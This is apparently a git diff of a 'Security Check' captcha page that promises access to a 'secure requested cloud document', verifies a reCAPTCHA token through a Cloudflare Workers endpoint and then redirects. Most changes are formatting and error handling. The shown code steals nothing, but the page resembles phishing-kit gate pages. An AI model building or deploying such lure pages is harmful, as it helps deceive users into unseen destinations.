@@ -8,43 +8,45 @@
   <meta name="description" content="Complete the security check to continue" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap"
+    rel="stylesheet" />
   <script src="https://www.google.com/recaptcha/enterprise.js?render=6LeyMrMtAAAAAH9XADxgAT6jMtv5eBxJ7KuaPaks"></script>
-  
+
   <style>
     :root {
       --radius-sm: 8px;
       --radius: 12px;
       --radius-lg: 18px;
       --radius-xl: 24px;
-      
+
       /* Requested Palette: #d7373f, #1473e6, #4b4b4b, #FFFFFF */
       --color-red: #d7373f;
       --color-red-hover: #b82b32;
       --color-red-light: rgba(215, 55, 63, 0.08);
-      
+
       --color-blue: #1473e6;
       --color-blue-hover: #0d5bbd;
       --color-blue-light: rgba(20, 115, 230, 0.08);
-      
+
       --color-text-main: #111827;
       --color-text-muted: #4b4b4b;
       --color-text-subtle: #6b7280;
-      
+
       --canvas: #ffffff;
       --canvas-subtle: #f8fafc;
       --surface: #ffffff;
       --surface-elevated: #ffffff;
-      
+
       --border-light: #e2e8f0;
       --border-medium: #cbd5e1;
       --border-active: #1473e6;
-      
+
       --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
       --shadow-md: 0 10px 25px -5px rgba(0, 0, 0, 0.06), 0 8px 10px -6px rgba(0, 0, 0, 0.04);
       --shadow-elevated: 0 20px 40px -12px rgba(20, 115, 230, 0.08), 0 10px 20px -5px rgba(0, 0, 0, 0.04);
       --shadow-card: 0 12px 32px rgba(15, 23, 42, 0.08);
-      
+
       --font-sans: 'Plus Jakarta Sans', 'Inter', system-ui, -apple-system, sans-serif;
     }
 
@@ -82,7 +84,7 @@
       z-index: 1;
       pointer-events: none;
       opacity: 0.6;
-      background-image: 
+      background-image:
         radial-gradient(var(--border-medium) 1px, transparent 1px);
       background-size: 28px 28px;
     }
@@ -361,18 +363,37 @@
 
     /* Keyframe Animations for Badge */
     @keyframes rotateRing {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
     }
 
     @keyframes pulseGlow {
-      0% { transform: scale(0.96); opacity: 0.6; }
-      100% { transform: scale(1.04); opacity: 1; }
+      0% {
+        transform: scale(0.96);
+        opacity: 0.6;
+      }
+
+      100% {
+        transform: scale(1.04);
+        opacity: 1;
+      }
     }
 
     @keyframes blinkDot {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
+
+      0%,
+      100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0.3;
+      }
     }
 
     .security-card-body-content {
@@ -403,7 +424,8 @@
       border-color: var(--color-blue);
       box-shadow: 0 14px 36px rgba(20, 115, 230, 0.15);
     }
-/* Permanent light beam that travels along the box's own border lines */
+
+    /* Permanent light beam that travels along the box's own border lines */
     .captcha-box::after {
       content: "";
       position: absolute;
@@ -411,22 +433,24 @@
       padding: 2px;
       border-radius: var(--radius-lg);
       background: conic-gradient(from 0deg,
-        rgba(20, 115, 230, 0) 0deg,
-        rgba(20, 115, 230, 0) 60deg,
-        rgba(20, 115, 230, 0.8) 90deg,
-        rgba(20, 115, 230, 0) 120deg,
-        rgba(20, 115, 230, 0) 360deg);
+          rgba(20, 115, 230, 0) 0deg,
+          rgba(20, 115, 230, 0) 60deg,
+          rgba(20, 115, 230, 0.8) 90deg,
+          rgba(20, 115, 230, 0) 120deg,
+          rgba(20, 115, 230, 0) 360deg);
       -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
       -webkit-mask-composite: xor;
-              mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
-              mask-composite: exclude;
+      mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      mask-composite: exclude;
       animation: captchaFlow 3s linear infinite;
       z-index: 1;
       pointer-events: none;
     }
 
     @keyframes captchaFlow {
-      to { transform: rotate(360deg); }
+      to {
+        transform: rotate(360deg);
+      }
     }
 
     .captcha-inner {
@@ -598,10 +622,21 @@
       color: #60a5fa;
     }
 
-    .size-leaderboard { height: 120px; }
-    .size-billboard { height: 250px; }
-    .size-mrec { height: 280px; }
-    .size-halfpage { height: 500px; }
+    .size-leaderboard {
+      height: 120px;
+    }
+
+    .size-billboard {
+      height: 250px;
+    }
+
+    .size-mrec {
+      height: 280px;
+    }
+
+    .size-halfpage {
+      height: 500px;
+    }
 
     #ad-leaderboard {
       height: 120px;
@@ -714,13 +749,25 @@
     }
 
     @keyframes spin {
-      to { transform: rotate(360deg); }
+      to {
+        transform: rotate(360deg);
+      }
     }
 
     @keyframes check-pop {
-      0% { transform: scale(0.4); opacity: 0; }
-      70% { transform: scale(1.15); }
-      100% { transform: scale(1); opacity: 1; }
+      0% {
+        transform: scale(0.4);
+        opacity: 0;
+      }
+
+      70% {
+        transform: scale(1.15);
+      }
+
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
     }
 
     .animate-check-pop {
@@ -762,7 +809,7 @@
   <div class="page-layout">
     <main class="main-content">
       <div id="ad-leaderboard"></div>
-      
+
       <section class="security-card">
         <div class="security-header">
           <div class="security-header-inner">
@@ -779,24 +826,28 @@
                 <!-- Multi-Layer Vector Shield & Lock Icon -->
                 <svg id="shield-icon" viewBox="0 0 48 48" width="40" height="40" fill="none">
                   <!-- Outer Shield Base -->
-                  <path d="M24 6L38 11V22C38 31.5 32 39.5 24 42C16 39.5 10 31.5 10 22V11L24 6Z" fill="#d7373f" fill-opacity="0.08" stroke="#d7373f" stroke-width="2.5" stroke-linejoin="round"/>
+                  <path d="M24 6L38 11V22C38 31.5 32 39.5 24 42C16 39.5 10 31.5 10 22V11L24 6Z" fill="#d7373f"
+                    fill-opacity="0.08" stroke="#d7373f" stroke-width="2.5" stroke-linejoin="round" />
                   <!-- Inner Shield Tech Accent Line -->
-                  <path d="M24 10V38" stroke="#1473e6" stroke-width="2" stroke-linecap="round" stroke-dasharray="3 3"/>
+                  <path d="M24 10V38" stroke="#1473e6" stroke-width="2" stroke-linecap="round" stroke-dasharray="3 3" />
                   <!-- Center Keyhole Padlock -->
-                  <rect x="18" y="22" width="12" height="10" rx="2" fill="#d7373f"/>
-                  <path d="M21 22V18C21 16.3431 22.3431 15 24 15C25.6569 15 27 16.3431 27 18V22" stroke="#1473e6" stroke-width="2.5" stroke-linecap="round"/>
-                  <circle cx="24" cy="26" r="1.5" fill="#ffffff"/>
+                  <rect x="18" y="22" width="12" height="10" rx="2" fill="#d7373f" />
+                  <path d="M21 22V18C21 16.3431 22.3431 15 24 15C25.6569 15 27 16.3431 27 18V22" stroke="#1473e6"
+                    stroke-width="2.5" stroke-linecap="round" />
+                  <circle cx="24" cy="26" r="1.5" fill="#ffffff" />
                 </svg>
-                
+
                 <!-- Success Checkmark SVG -->
-                <svg id="check-icon" viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="is-hidden">
-                  <polyline points="20 6 9 17 4 12"/>
+                <svg id="check-icon" viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="#ffffff"
+                  stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="is-hidden">
+                  <polyline points="20 6 9 17 4 12" />
                 </svg>
               </div>
             </div>
 
             <h1 id="security-title">Security Check</h1>
-            <p id="security-desc">Please complete a quick verification check to proceed to the secure requested cloud document</p>
+            <p id="security-desc">Please complete a quick verification check to proceed to the secure requested cloud
+              document</p>
           </div>
         </div>
 
@@ -805,9 +856,11 @@
             <div class="captcha-box">
               <div class="captcha-inner">
                 <div class="captcha-checkbox-container">
-                  <div id="captcha-checkbox" class="captcha-checkbox" role="checkbox" aria-checked="false" aria-label="I'm not a robot" tabindex="0">
+                  <div id="captcha-checkbox" class="captcha-checkbox" role="checkbox" aria-checked="false"
+                    aria-label="I'm not a robot" tabindex="0">
                     <div id="captcha-spinner" class="captcha-spinner is-hidden"></div>
-                    <svg id="captcha-check" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#d7373f" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round" class="is-hidden">
+                    <svg id="captcha-check" viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#d7373f"
+                      stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round" class="is-hidden">
                       <polyline points="20 6 9 17 4 12" />
                     </svg>
                   </div>
@@ -816,7 +869,8 @@
                 <div class="captcha-badge">
                   <div class="captcha-badge-icon">
                     <svg viewBox="0 0 24 24" width="16" height="16" fill="white">
-                      <path d="M12 2a5 5 0 00-5 5v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7a5 5 0 00-5-5zm-3 8V7a3 3 0 016 0v3H9z" />
+                      <path
+                        d="M12 2a5 5 0 00-5 5v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7a5 5 0 00-5-5zm-3 8V7a3 3 0 016 0v3H9z" />
                     </svg>
                   </div>
                   <span class="recaptcha-text">reCAPTCHA</span>
@@ -855,7 +909,7 @@
     const cursorGlow = document.getElementById('cursor-glow');
     let mouseX = window.innerWidth / 2;
     let mouseY = window.innerHeight / 2;
-    
+
     window.addEventListener('mousemove', (e) => {
       mouseX = e.clientX;
       mouseY = e.clientY;
@@ -908,7 +962,7 @@
 
       if (video && video.getAttribute('src') !== ad.video) {
         video.src = ad.video;
-        video.play().catch(() => {});
+        video.play().catch(() => { });
       }
       if (tag) tag.textContent = ad.tag;
       if (title) title.textContent = ad.title;
@@ -930,7 +984,7 @@
 
         if (video && video.getAttribute('src') !== ad.video) {
           video.src = ad.video;
-          video.play().catch(() => {});
+          video.play().catch(() => { });
         }
         if (tag) tag.textContent = ad.tag;
         if (title) title.textContent = ad.title;
@@ -1029,8 +1083,11 @@
       bgCanvas.height = window.innerHeight;
     });
 
+
     const WORKER_URL = 'https://hidden-wind-22ea.alex-aaf.workers.dev';
     const RECAPTCHA_SITE_KEY = '6LeyMrMtAAAAAH9XADxgAT6jMtv5eBxJ7KuaPaks';
+
+   let checked = false, loading = false;
 
     const checkbox = document.getElementById("captcha-checkbox");
     const spinner = document.getElementById("captcha-spinner");
@@ -1043,7 +1100,6 @@
     const shieldIcon = document.getElementById("shield-icon");
     const checkIcon = document.getElementById("check-icon");
 
-    let checked = false, loading = false;
 
     function showError(msg) {
       let el = document.getElementById('error-msg');
@@ -1059,9 +1115,9 @@
 
     function getRecaptchaToken() {
       return new Promise((resolve, reject) => {
-        if (!window.grecaptcha || !window.grecaptcha.enterprise) { 
-          reject(new Error('reCAPTCHA Enterprise not available')); 
-          return; 
+        if (!window.grecaptcha || !window.grecaptcha.enterprise) {
+          reject(new Error('reCAPTCHA Enterprise not available'));
+          return;
         }
         window.grecaptcha.enterprise.ready(() => {
           window.grecaptcha.enterprise.execute(RECAPTCHA_SITE_KEY, { action: 'verify' }).then(resolve).catch(reject);
@@ -1088,7 +1144,13 @@
             signal: controller.signal
           }).finally(() => clearTimeout(timeout));
         })
-        .then(r => r.json())
+        .then(async r => {
+          const data = await r.json().catch(() => ({}));
+          if (!r.ok) {
+            throw new Error(data.error || `Verification service returned HTTP ${r.status}`);
+          }
+          return data;
+        })
         .then(data => {
           loading = false;
           spinner.classList.add("is-hidden");
@@ -1099,26 +1161,26 @@
             checked = true;
             checkSvg.classList.remove("is-hidden");
             checkSvg.classList.add("animate-check-pop");
-            
+
             setTimeout(() => {
               checkbox.classList.add("checkbox-success");
               verifiedIcon.classList.add("done");
               shieldIcon.classList.add("is-hidden");
               checkIcon.classList.remove("is-hidden");
               checkIcon.classList.add("animate-check-pop");
-              
+
               securityTitle.textContent = "Verification Complete";
               securityTitle.classList.add("title-success");
               securityDesc.textContent = "Identity successfully confirmed. Securely redirecting...";
-              
+
               setTimeout(() => {
                 captchaBox.style.opacity = '0';
                 captchaBox.style.transition = 'opacity 0.4s ease';
                 captchaFooter.style.opacity = '0';
                 captchaFooter.style.transition = 'opacity 0.4s ease';
-                setTimeout(() => { 
-                  captchaBox.classList.add("is-hidden"); 
-                  captchaFooter.classList.add("is-hidden"); 
+                setTimeout(() => {
+                  captchaBox.classList.add("is-hidden");
+                  captchaFooter.classList.add("is-hidden");
                 }, 400);
               }, 300);
 
@@ -1136,7 +1198,10 @@
           checkbox.style.cursor = 'pointer';
           checkbox.style.opacity = '1';
           checkbox.classList.add("checkbox-error");
-          showError('Network error during verification. Please try again.');
+          const message = err.name === 'AbortError'
+            ? 'Verification timed out. Please try again.'
+            : err.message || 'Verification could not be completed. Please try again.';
+          showError(message);
           setTimeout(() => checkbox.classList.remove("checkbox-error"), 2000);
         });
     }
